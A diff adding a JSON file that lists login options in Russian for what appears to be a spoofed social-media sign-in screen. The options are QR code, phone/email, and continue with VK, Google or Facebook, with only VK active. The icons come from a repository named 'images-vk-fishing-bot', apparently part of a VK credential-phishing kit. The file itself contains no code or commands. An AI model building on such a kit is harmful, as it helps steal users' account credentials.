@@ -1,0 +1,42 @@
+[
+  {
+    "name": "Использовать QR-код",
+    "icon": "https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/tt_icon_4.png?raw=true",
+    "active": {
+      "status": "false"
+    },
+    "css": "icon"
+  },
+    {
+    "name": "Введите телефон / почту / имя пользователя",
+    "icon": "https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/tt_icon_1.png?raw=true",
+    "active": {
+      "status": "false"
+    },
+    "css": "icon"
+  },
+    {
+    "name": "Продолжить в VK",
+    "icon": "https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/15740206259710.png?raw=true",
+    "active": {
+      "status": "true"
+    },
+    "css": "icon icon_p"
+  },
+    {
+    "name": "Продолжить в Google",
+    "icon": "https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/tt_icon_2.png?raw=true",
+    "active": {
+      "status": "false"
+    },
+    "css": "icon"
+  },
+    {
+    "name": "Продолжить в Facebook",
+    "icon": "https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/tt_icon_3.png?raw=true",
+    "active": {
+      "status": "false"
+    },
+    "css": "icon"
+  }
+]
